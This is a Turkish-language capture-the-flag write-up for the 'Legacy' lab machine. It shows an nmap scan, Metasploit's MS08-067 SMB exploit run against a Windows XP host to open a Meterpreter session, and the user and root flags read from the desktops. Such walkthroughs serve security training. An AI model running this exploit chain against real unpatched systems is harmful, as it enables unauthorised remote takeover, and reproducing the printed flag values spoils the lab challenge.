<img width="677" height="457" alt="1_T_XQP99E8f46wWIFNwOsLA" src="https://github.com/user-attachments/assets/3d458874-2f75-4c29-865e-c5c06a75416a" />

## About

Legacy, başlangıç seviyesindeki oldukça basit bir makine olsa da, Windows üzerinde SMB servisinin ne kadar tehlikeli olabileceğini net bir şekilde gösteriyor. Administrator yetkisine ulaşmak için sadece tek, herkese açık bir exploit yeterli.

---

## Keşif

Klasik açılışla başlıyoruz, kapsamlı bir nmap taraması:

```
nmap -sS -A -p- -T5 10.129.227.181
```

<img width="1005" height="745" alt="nmap" src="https://github.com/user-attachments/assets/1172edf7-4bfc-42ec-ae98-35c626512e7a" />


Burada gördüğüm şey çok net: hedefte **Windows XP** çalışıyor ve 445 portu üzerinden SMB servisi açık. Makinenin "About" kısmı da zaten SMB ile ilgili bir zafiyetten bahsediyordu, yani doğru yoldaydım.

Windows XP + SMB kombinasyonu gördüğümde aklıma gelen ilk şey, bu sürümün en bilinen ve en çok istismar edilen açıklarından biri oldu. Emin olmak için hızlıca "Windows XP SMB exploit" diye arattım ve karşıma net bir şekilde **MS08-067** çıktı — Microsoft Server Service'teki bir path canonicalization açığı yüzünden, kimlik doğrulama gerekmeden uzaktan kod çalıştırmaya izin veren, 2008'den beri bilinen çok meşhur bir zafiyet.

---

## MS08-067 Exploitation

Metasploit'te modülü aradım:

```
msf > search MS08-067
```

```
Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28        great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
```

Modülü seçtim ve gerekli ayarlara baktım:

```
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi) > show options
```

`RHOSTS`, `LHOST` ve `LPORT` gibi standart parametreleri ayarladım:

```
set RHOSTS 10.129.227.181
set LHOST 10.10.14.187
```

Ve exploiti çalıştırdım:

```
msf exploit(windows/smb/ms08_067_netapi) > run
```

<img width="1004" height="724" alt="msfconsoleshell" src="https://github.com/user-attachments/assets/6ba5ed0c-cba9-42ca-8bcb-132d6c8fe574" />


Exploit sorunsuz çalıştı ve karşımda bir **Meterpreter oturumu** açıldı.
---

## Flag'ler

Oturumu aldıktan sonra dosya sisteminde flag'leri aramaya başladım. Windows XP'de kullanıcı klasörleri modern Windows'tan farklı olarak `C:\Documents and Settings\` altında tutuluyor, ona göre gezindim.

Önce `john` kullanıcısının masaüstüne baktım:

```
meterpreter > cd Documents\ and\ Settings\\
meterpreter > ls
```

```
Listing: C:\Documents and Settings
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-03-16 02:07:21 -0400  Administrator
040777/rwxrwxrwx  0     dir   2017-03-16 01:29:48 -0400  All Users
040777/rwxrwxrwx  0     dir   2017-03-16 01:33:37 -0400  Default User
040777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
040777/rwxrwxrwx  0     dir   2017-03-16 01:32:43 -0400  NetworkService
040777/rwxrwxrwx  0     dir   2017-03-16 01:33:42 -0400  john
```

```
meterpreter > cd john
meterpreter > cd Desktop
meterpreter > ls
```

```
Listing: C:\Documents and Settings\john\Desktop
================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:19:49 -0400  user.txt
```

```
meterpreter > cat user.txt
e69af0e4f443de7e36876fda4ec7644f
```

<img width="604" height="781" alt="userflag" src="https://github.com/user-attachments/assets/774656da-01d1-499c-a7b8-2a60a4e54723" />


**User flag** elde edildi.

Ardından aynı şekilde Administrator'ın masaüstüne geçtim:

```
meterpreter > cd ../..
meterpreter > cd Administrator\\
meterpreter > cd Desktop
meterpreter > ls
```

```
Listing: C:\Documents and Settings\Administrator\Desktop
==========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:18:50 -0400  root.txt
```

```
meterpreter > cat root.txt
993442d258b0e0ec917cae9e695d5713
```

<img width="618" height="779" alt="rootflag" src="https://github.com/user-attachments/assets/0bb6beb6-5500-49ae-aab6-68a92c4d9be5" />

**Root flag** de böylece elimizdeydi.
